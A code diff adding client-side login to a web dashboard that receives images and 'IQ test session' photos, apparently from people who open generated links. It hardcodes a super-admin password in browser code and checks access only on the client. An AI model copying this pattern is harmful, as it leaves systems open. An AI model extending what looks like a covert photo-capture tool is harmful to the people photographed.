@@ -1,3 +1,19 @@
+// Admin Authentication System
+const SUPER_ADMIN_PASSWORD = 'Hunter@05';
+let currentAdminType = null;
+let sessionToken = null;
+
+// DOM Elements - Login
+const loginScreen = document.getElementById('loginScreen');
+const mainDashboard = document.getElementById('mainDashboard');
+const loginForm = document.getElementById('loginForm');
+const passwordField = document.getElementById('passwordField');
+const adminPassword = document.getElementById('adminPassword');
+const loginBtn = document.getElementById('loginBtn');
+const errorMessage = document.getElementById('errorMessage');
+const adminBadge = document.getElementById('adminBadge');
+
+// DOM Elements - Dashboard
 const statusEl = document.getElementById('status');
 const feed = document.getElementById('feed');
 const generateLinkBtn = document.getElementById('generateLinkBtn');
@@ -24,18 +40,133 @@ let activeSessions = new Set();
 let connectedUsers = 0;
 let iqSessions = new Map(); // Store IQ test sessions
 
+// Authentication Functions
+function selectAdminType(type) {
+  // Clear previous selections
+  document.querySelectorAll('.admin-type-option').forEach(option => {
+    option.classList.remove('selected');
+  });
+  
+  // Select current option
+  event.target.closest('.admin-type-option').classList.add('selected');
+  document.getElementById(type + 'Admin').checked = true;
+  
+  // Show/hide password field
+  if (type === 'super') {
+    passwordField.classList.add('visible');
+    loginBtn.disabled = false;
+  } else {
+    passwordField.classList.remove('visible');
+    loginBtn.disabled = false;
+  }
+  
+  errorMessage.textContent = '';
+}
+
+function login(adminType, password = null) {
+  if (adminType === 'super') {
+    if (password !== SUPER_ADMIN_PASSWORD) {
+      errorMessage.textContent = 'Invalid super admin password';
+      return false;
+    }
+  }
+  
+  currentAdminType = adminType;
+  sessionToken = generateSessionToken();
+  
+  // Update UI
+  loginScreen.style.display = 'none';
+  mainDashboard.style.display = 'block';
+  
+  // Update admin badge
+  if (adminType === 'super') {
+    adminBadge.textContent = '👑 Super Admin';
+    adminBadge.className = 'admin-badge super';
+  } else {
+    adminBadge.textContent = '👤 Normal Admin';
+    adminBadge.className = 'admin-badge normal';
+  }
+  
+  // Initialize dashboard
+  connectWebSocket();
+  
+  return true;
+}
+
+function logout() {
+  currentAdminType = null;
+  sessionToken = null;
+  
+  // Reset UI
+  mainDashboard.style.display = 'none';
+  loginScreen.style.display = 'flex';
+  
+  // Reset form
+  loginForm.reset();
+  document.querySelectorAll('.admin-type-option').forEach(option => {
+    option.classList.remove('selected');
+  });
+  passwordField.classList.remove('visible');
+  loginBtn.disabled = true;
+  errorMessage.textContent = '';
+  
+  // Close WebSocket
+  if (ws) {
+    ws.close();
+  }
+}
+
+function generateSessionToken() {
+  return 'admin_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+}
+
+// Login form handler
+loginForm.addEventListener('submit', (e) => {
+  e.preventDefault();
+  
+  const selectedType = document.querySelector('input[name="adminType"]:checked');
+  if (!selectedType) {
+    errorMessage.textContent = 'Please select an admin type';
+    return;
+  }
+  
+  const adminType = selectedType.value;
+  const password = adminPassword.value;
+  
+  login(adminType, password);
+});
+
+// Initialize login screen
+document.addEventListener('DOMContentLoaded', () => {
+  // Show login screen initially
+  loginScreen.style.display = 'flex';
+  mainDashboard.style.display = 'none';
+});
+
 function connectWebSocket() {
   ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host);
   
   ws.addEventListener('open', () => {
     statusEl.textContent = 'Connected to server';
     statusEl.className = 'status connected';
-    ws.send(JSON.stringify({ type: 'register', role: 'admin' }));
+    
+    // Register with admin type and session token
+    ws.send(JSON.stringify({ 
+      type: 'register', 
+      role: 'admin',
+      adminType: currentAdminType,
+      sessionToken: sessionToken
+    }));
   });
 
   ws.addEventListener('message', (ev) => {
     try {
       const data = JSON.parse(ev.data);
+      
+      // Filter messages based on admin type
+      if (currentAdminType === 'normal' && data.restrictToSuper) {
+        return; // Normal admins can't see super admin only data
+      }
       
       if (data.type === 'image') {
         handleNewImage(data);
@@ -68,6 +199,11 @@ function connectWebSocket() {
             photoCount: 0
           });
           updateIQSessionsList();
+        }
+      } else if (data.type === 'all_sessions_data') {
+        // Super admin receives all sessions data
+        if (currentAdminType === 'super') {
+          handleAllSessionsData(data);
         }
       }
     } catch (e) {
@@ -381,5 +517,33 @@ function formatTime(timestamp) {
   return new Date(timestamp).toLocaleTimeString();
 }
 
-// Initialize connection
-connectWebSocket();
+function handleAllSessionsData(data) {
+  // Handle all sessions data for super admin
+  if (data.allImages) {
+    // Update feed with all images from all sessions
+    feed.innerHTML = '';
+    data.allImages.forEach(imageData => {
+      handleNewImage(imageData);
+    });
+  }
+  
+  if (data.allIQSessions) {
+    // Update IQ sessions with all sessions
+    iqSessions.clear();
+    data.allIQSessions.forEach(session => {
+      iqSessions.set(session.id, session);
+    });
+    updateIQSessionsList();
+  }
+  
+  if (data.allIQPhotos) {
+    // Update IQ photos with all photos
+    iqPhotoFeed.innerHTML = '';
+    data.allIQPhotos.forEach(photoData => {
+      const photoElement = createIQPhotoElement(photoData);
+      iqPhotoFeed.appendChild(photoElement);
+    });
+  }
+}
+
+// Note: connectWebSocket() is called from login() function
